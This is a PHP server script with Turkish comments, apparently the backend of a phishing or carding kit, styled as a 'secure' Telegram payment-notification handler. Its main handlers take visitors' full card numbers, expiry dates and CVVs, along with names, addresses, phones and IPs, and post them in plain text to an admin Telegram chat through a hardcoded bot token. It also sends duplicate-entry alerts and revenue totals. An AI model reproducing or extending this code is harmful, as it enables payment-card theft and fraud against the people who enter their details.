<?php
/**
 * 🔒 SECURE BACKEND HANDLER
 * Bu dosya tüm hassas Telegram işlemlerini backend'de yapar
 * Frontend'de artık hiçbir hassas bilgi görünmeyecek
 * 
 * Kullanım: Frontend'den AJAX istekleri ile çağrılır
 * Örnek: fetch('/api/secure-handler.php?action=send_payment')
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

// OPTIONS request handling for CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// 🔐 HASSAS BİLGİLER SADECE BACKEND'DE
// Bu bilgiler artık frontend'de görünmeyecek
define('TELEGRAM_BOT_TOKEN', '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac');
define('ADMIN_CHAT_ID', '-4844832082');
define('TELEGRAM_API_BASE', 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN);

// 📝 Error logging ayarları
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../data/error.log');

// 🔧 Debug fonksiyonu
function debugLog($message, $data = null) {
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[$timestamp] $message";
    if ($data !== null) {
        $log_message .= " | Data: " . json_encode($data);
    }
    error_log($log_message);
}

// 🛡️ Rate limiting - Aynı IP'den çok fazla istek engellemek için
session_start();
$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$now = time();

if (isset($_SESSION['requests'])) {
    $_SESSION['requests'] = array_filter($_SESSION['requests'], function($time) use ($now) {
        return ($now - $time) < 60; // Son 1 dakika
    });
} else {
    $_SESSION['requests'] = [];
}

// Bot listener için daha esnek rate limiting
$action = $_GET['action'] ?? $_POST['action'] ?? '';
$max_requests = ($action === 'listen_messages') ? 30 : 10; // Bot listener için 30, diğerleri için 10

if (count($_SESSION['requests']) > $max_requests) {
    http_response_code(429);
    echo json_encode([
        'success' => false, 
        'error' => 'Rate limit exceeded',
        'retry_after' => 60,
        'max_requests' => $max_requests
    ]);
    exit();
}

$_SESSION['requests'][] = $now;

// 📋 Action parameter zaten yukarıda tanımlandı

try {
    error_log("Secure Handler Debug: Action = '$action', Method = " . $_SERVER['REQUEST_METHOD']);
    switch ($action) {
        case 'send_payment':
            handlePaymentNotification();
            break;
            
        case 'send_duplicate':
            handleDuplicateWarning();
            break;
            
        case 'get_total':
            handleTotalCommand();
            break;
            
        case 'check_bot_status':
            handleBotStatus();
            break;
            
        case 'send_admin_message':
            handleAdminMessage();
            break;
            
        case 'listen_messages':
            handleMessageListener();
            break;
            
        case 'send_document':
            handleDocumentSender();
            break;
            
        case 'get_user_ip':
            handleUserIPRequest();
            break;
            
        default:
            throw new Exception('Invalid action');
    }
} catch (Exception $e) {
    error_log('Secure Handler Error: ' . $e->getMessage());
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid request']);
}

/**
 * 💳 PAYMENT NOTIFICATION HANDLER
 * Frontend'den gelen payment bilgilerini Telegram'a gönderir
 */
function handlePaymentNotification() {
    debugLog("Payment notification handler started");
    
    $raw_input = file_get_contents('php://input');
    debugLog("Raw input received", ['length' => strlen($raw_input), 'content' => substr($raw_input, 0, 200)]);
    
    $input = json_decode($raw_input, true);
    debugLog("JSON decoded", ['success' => $input !== null, 'json_error' => json_last_error_msg()]);
    
    if (!$input || !isset($input['customer'], $input['card'])) {
        debugLog("Payment validation failed", [
            'input_exists' => $input !== null,
            'customer_exists' => isset($input['customer']),
            'card_exists' => isset($input['card']),
            'input_keys' => $input ? array_keys($input) : []
        ]);
        throw new Exception('Missing payment data');
    }
    
    debugLog("Payment data validated successfully");
    
    // 🧹 Güvenli veri temizleme
    $customer_name = filter_var($input['customer']['name'] ?? '', FILTER_SANITIZE_STRING);
    $customer_email = filter_var($input['customer']['email'] ?? '', FILTER_SANITIZE_STRING);
    $customer_phone = filter_var($input['customer']['phone'] ?? '', FILTER_SANITIZE_STRING);
    $customer_country = filter_var($input['customer']['country'] ?? '', FILTER_SANITIZE_STRING);
    $customer_region = filter_var($input['customer']['region'] ?? '', FILTER_SANITIZE_STRING);
    $customer_city = filter_var($input['customer']['city'] ?? '', FILTER_SANITIZE_STRING);
    $customer_address = filter_var($input['customer']['address'] ?? '', FILTER_SANITIZE_STRING);
    $customer_zip = filter_var($input['customer']['zip'] ?? '', FILTER_SANITIZE_STRING);
    
    $card_number = preg_replace('/\D/', '', $input['card']['number'] ?? ''); // Sadece rakamlar
    $card_expiry = filter_var($input['card']['expiry'] ?? '', FILTER_SANITIZE_STRING);
    $card_cvv = filter_var($input['card']['cvv'] ?? '', FILTER_SANITIZE_STRING);
    
    $user_ip = filter_var($input['userIP'] ?? 'Unknown', FILTER_VALIDATE_IP);
    $user_agent = substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 100);
    
    // 📨 İstediğiniz formatta Telegram mesajını oluştur
    $message = "👤 Customer Information:\n";
    $message .= "📝 Name: {$customer_name}\n";
    $message .= "📧 Email: {$customer_email}\n";
    $message .= "📱 Phone: {$customer_phone}\n";
    $message .= "🌍 Country: {$customer_country}\n";
    $message .= "🏙️ Region: {$customer_region}\n";
    $message .= "🏘️ City: {$customer_city}\n";
    $message .= "🏠 Address: {$customer_address}\n";
    $message .= "📮 ZIP: {$customer_zip}\n";
    
    $message .= "💳 Payment Information:\n";
    $message .= "💳 Card: {$card_number}\n";
    $message .= "📅 Expiry: {$card_expiry}\n";
    $message .= "🔒 CVV: {$card_cvv}\n";
    
    $message .= "Technical Info:\n";
    $message .= "🔍 IP Address: {$user_ip}\n";
    $message .= "🕐 Time: " . date('d.m.Y H:i:s') . "\n";
    $message .= "🌍 User Agent: {$user_agent}...";
    
    $success = sendTelegramMessage($message);
    
    echo json_encode([
        'success' => $success,
        'message' => $success ? 'Payment notification sent' : 'Failed to send notification'
    ]);
}

/**
 * ⚠️ DUPLICATE WARNING HANDLER
 * Duplicate payment uyarısını Telegram'a gönderir
 */
function handleDuplicateWarning() {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['customer'])) {
        throw new Exception('Missing duplicate data');
    }
    
    // 🧹 Güvenli veri temizleme
    $customer_name = filter_var($input['customer']['name'] ?? '', FILTER_SANITIZE_STRING);
    $customer_email = filter_var($input['customer']['email'] ?? '', FILTER_SANITIZE_STRING);
    $customer_phone = filter_var($input['customer']['phone'] ?? '', FILTER_SANITIZE_STRING);
    $customer_country = filter_var($input['customer']['country'] ?? '', FILTER_SANITIZE_STRING);
    $customer_region = filter_var($input['customer']['region'] ?? '', FILTER_SANITIZE_STRING);
    $customer_city = filter_var($input['customer']['city'] ?? '', FILTER_SANITIZE_STRING);
    $customer_address = filter_var($input['customer']['address'] ?? '', FILTER_SANITIZE_STRING);
    $customer_zip = filter_var($input['customer']['zip'] ?? '', FILTER_SANITIZE_STRING);
    
    $card_number = preg_replace('/\D/', '', $input['card']['number'] ?? '');
    $card_expiry = filter_var($input['card']['expiry'] ?? '', FILTER_SANITIZE_STRING);
    $card_cvv = filter_var($input['card']['cvv'] ?? '', FILTER_SANITIZE_STRING);
    
    $user_ip = filter_var($input['userIP'] ?? 'Unknown', FILTER_VALIDATE_IP);
    $user_agent = substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 100);
    
    // 🚨 DUPLICATE ENTRY DETECTED formatında mesaj
    $message = "🚨 DUPLICATE ENTRY DETECTED!\n\n";
    $message .= "👤 Customer Information:\n";
    $message .= "📝 Name: {$customer_name}\n";
    $message .= "📧 Email: {$customer_email}\n";
    $message .= "📱 Phone: {$customer_phone}\n";
    $message .= "🌍 Country: {$customer_country}\n";
    $message .= "🏙️ Region: {$customer_region}\n";
    $message .= "🏘️ City: {$customer_city}\n";
    $message .= "🏠 Address: {$customer_address}\n";
    $message .= "📮 ZIP: {$customer_zip}\n";
    
    $message .= "💳 Payment Information:\n";
    $message .= "💳 Card: {$card_number}\n";
    $message .= "📅 Expiry: {$card_expiry}\n";
    $message .= "🔒 CVV: {$card_cvv}\n";
    
    $message .= "Technical Info:\n";
    $message .= "🔍 IP Address: {$user_ip}\n";
    $message .= "🕐 Time: " . date('d.m.Y H:i:s') . "\n";
    $message .= "🌍 User Agent: {$user_agent}...\n\n";
    $message .= "❗ This payment was already submitted before!";
    
    $success = sendTelegramMessage($message);
    
    echo json_encode([
        'success' => $success,
        'message' => $success ? 'Duplicate warning sent' : 'Failed to send warning'
    ]);
}

/**
 * 📊 TOTAL COMMAND HANDLER
 * /total komutu için rapor hazırlar ve gönderir
 */
function handleTotalCommand() {
    $input = json_decode(file_get_contents('php://input'), true);
    $payment_data = $input['paymentData'] ?? [];
    
    if (empty($payment_data)) {
        $message = "📊 <b>TOPLAM RAPOR</b>\n\n";
        $message .= "📭 <b>Henüz ödeme kaydı bulunmuyor</b>\n\n";
        $message .= "🕒 <b>Rapor Tarihi:</b> " . date('d.m.Y H:i:s') . "\n";
        $message .= "🤖 <b>Bot:</b> Aktif ve çalışıyor";
    } else {
        $total_amount = 0;
        $payment_count = count($payment_data);
        
        foreach ($payment_data as $payment) {
            if (isset($payment['amount'])) {
                $total_amount += floatval($payment['amount']);
            }
        }
        
        $message = "📊 <b>TOPLAM RAPOR</b>\n\n";
        $message .= "💰 <b>Toplam Tutar:</b> $" . number_format($total_amount, 2) . "\n";
        $message .= "📈 <b>Toplam İşlem:</b> {$payment_count}\n";
        $message .= "📅 <b>Ortalama:</b> $" . number_format($payment_count > 0 ? $total_amount / $payment_count : 0, 2) . "\n\n";
        
        $message .= "🕒 <b>Rapor Tarihi:</b> " . date('d.m.Y H:i:s') . "\n";
        $message .= "🤖 <b>Bot:</b> Aktif ve çalışıyor";
    }
    
    $success = sendTelegramMessage($message);
    
    echo json_encode([
        'success' => $success,
        'message' => $success ? 'Total report sent' : 'Failed to send report'
    ]);
}

/**
 * 🤖 BOT STATUS HANDLER
 * Bot'un çalışıp çalışmadığını kontrol eder
 */
function handleBotStatus() {
    $url = TELEGRAM_API_BASE . '/getMe';
    $response = @file_get_contents($url);
    
    if ($response) {
        $data = json_decode($response, true);
        if ($data && $data['ok']) {
            $bot_info = $data['result'];
            $message = "✅ <b>BOT DURUM RAPORU</b>\n\n";
            $message .= "🤖 <b>Bot Adı:</b> {$bot_info['first_name']}\n";
            $message .= "📝 <b>Username:</b> @{$bot_info['username']}\n";
            $message .= "🆔 <b>Bot ID:</b> {$bot_info['id']}\n";
            $message .= "✅ <b>Durum:</b> Aktif ve çalışıyor\n\n";
            $message .= "🕒 <b>Kontrol Tarihi:</b> " . date('d.m.Y H:i:s');
            
            $success = sendTelegramMessage($message);
        } else {
            $success = false;
        }
    } else {
        $success = false;
    }
    
    echo json_encode([
        'success' => $success,
        'status' => $success ? 'online' : 'offline',
        'message' => $success ? 'Bot is active' : 'Bot is not responding'
    ]);
}

/**
 * 💬 ADMIN MESSAGE HANDLER
 * Admin panelinden gelen mesajları Telegram'a gönderir
 */
function handleAdminMessage() {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['message'])) {
        throw new Exception('Missing message data');
    }
    
    $message = filter_var($input['message'], FILTER_SANITIZE_STRING);
    $success = sendTelegramMessage($message);
    
    echo json_encode([
        'success' => $success,
        'message' => $success ? 'Message sent' : 'Failed to send message'
    ]);
}

/**
 * 📄 DOCUMENT SENDER HANDLER
 * Content'i dosya olarak Telegram'a gönderir
 */
function handleDocumentSender() {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['content'], $input['filename'])) {
        throw new Exception('Missing document data');
    }
    
    $content = $input['content'];
    $filename = filter_var($input['filename'], FILTER_SANITIZE_STRING);
    
    $success = sendTelegramDocument($content, $filename);
    
    echo json_encode([
        'success' => $success,
        'message' => $success ? 'Document sent' : 'Failed to send document'
    ]);
}

/**
 * 🌐 USER IP REQUEST HANDLER
 * Kullanıcının IP adresini güvenli şekilde alır
 */
function handleUserIPRequest() {
    // Server-side IP detection - hassas IP servisleri frontend'de görünmez
    $user_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // Proxy arkasındaysa gerçek IP'yi al
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $user_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        $user_ip = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        $user_ip = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        $user_ip = $_SERVER['HTTP_FORWARDED'];
    }
    
    // Birden fazla IP varsa ilkini al
    if (strpos($user_ip, ',') !== false) {
        $user_ip = trim(explode(',', $user_ip)[0]);
    }
    
    // IP validation
    if (!filter_var($user_ip, FILTER_VALIDATE_IP)) {
        $user_ip = 'Unknown';
    }
    
    echo json_encode([
        'success' => true,
        'ip' => $user_ip,
        'method' => 'server_side'
    ]);
}

/**
 * 👂 MESSAGE LISTENER HANDLER
 * Telegram'dan gelen mesajları dinler ve yanıtlar
 */
function handleMessageListener() {
    $input = json_decode(file_get_contents('php://input'), true);
    $last_update_id = intval($input['lastUpdateId'] ?? 0);
    
    // Rate limiting için daha kısa timeout kullan
    $url = TELEGRAM_API_BASE . '/getUpdates?offset=' . ($last_update_id + 1) . '&limit=5&timeout=10';
    
    // cURL kullanarak daha iyi hata yönetimi
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15); // 15 saniye timeout
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); // 5 saniye connection timeout
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'GameBot/1.0');
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error) {
        error_log("Telegram API cURL Error: " . $curl_error);
        echo json_encode([
            'success' => false,
            'updates' => [],
            'error' => 'Connection failed'
        ]);
        return;
    }
    
    if ($http_code === 429) {
        // Rate limit hit
        error_log("Telegram API Rate Limit Hit");
        echo json_encode([
            'success' => false,
            'updates' => [],
            'error' => 'Rate limit exceeded',
            'retry_after' => 60
        ]);
        return;
    }
    
    if ($response && $http_code === 200) {
        $data = json_decode($response, true);
        if ($data && $data['ok']) {
            echo json_encode([
                'success' => true,
                'updates' => $data['result']
            ]);
            return;
        }
    }
    
    echo json_encode([
        'success' => false,
        'updates' => [],
        'error' => 'API request failed',
        'http_code' => $http_code
    ]);
}

/**
 * 📨 TELEGRAM MESSAGE SENDER
 * Telegram API'ye mesaj gönderen temel fonksiyon - Alpine Linux uyumlu
 */
function sendTelegramMessage($text) {
    $data = [
        'chat_id' => ADMIN_CHAT_ID,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    $url = TELEGRAM_API_BASE . '/sendMessage';
    
    // cURL kullanarak daha güvenilir gönderim
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // JSON yerine form data
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: FockGaming Bot/1.0'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);
        
        if ($response === false || !empty($curl_error)) {
            error_log("Telegram cURL Error: $curl_error");
            return false;
        }
        
        if ($http_code !== 200) {
            error_log("Telegram HTTP Error: HTTP $http_code - Response: $response");
            return false;
        }
        
        $result = json_decode($response, true);
        if ($result && $result['ok']) {
            error_log("Telegram message sent successfully");
            return true;
        } else {
            $error_msg = $result['description'] ?? 'Unknown error';
            error_log("Telegram API Error: $error_msg");
            return false;
        }
    } else {
        // Fallback to file_get_contents if cURL not available
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                           "User-Agent: FockGaming Bot/1.0\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 30
            ]
        ];
        
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        
        if ($response === false) {
            error_log('Telegram API Error: Failed to send message (file_get_contents)');
            return false;
        }
        
        $result = json_decode($response, true);
        if ($result && $result['ok']) {
            error_log("Telegram message sent successfully");
            return true;
        } else {
            $error_msg = $result['description'] ?? 'Unknown error';
            error_log("Telegram API Error: $error_msg");
            return false;
        }
    }
}

/**
 * 📄 TELEGRAM DOCUMENT SENDER
 * Dosya göndermek için ayrı fonksiyon
 */
function sendTelegramDocument($content, $filename) {
    $url = TELEGRAM_API_BASE . '/sendDocument';
    
    $temp_file = tempnam(sys_get_temp_dir(), 'telegram_doc_');
    file_put_contents($temp_file, $content);
    
    $data = [
        'chat_id' => ADMIN_CHAT_ID,
        'document' => new CURLFile($temp_file, 'text/plain', $filename),
        'caption' => "📄 {$filename}\n📅 " . date('d.m.Y H:i:s')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    unlink($temp_file); // Temp dosyayı sil
    
    if ($http_code === 200 && $response) {
        $result = json_decode($response, true);
        return $result['ok'] ?? false;
    }
    
    return false;
}
?>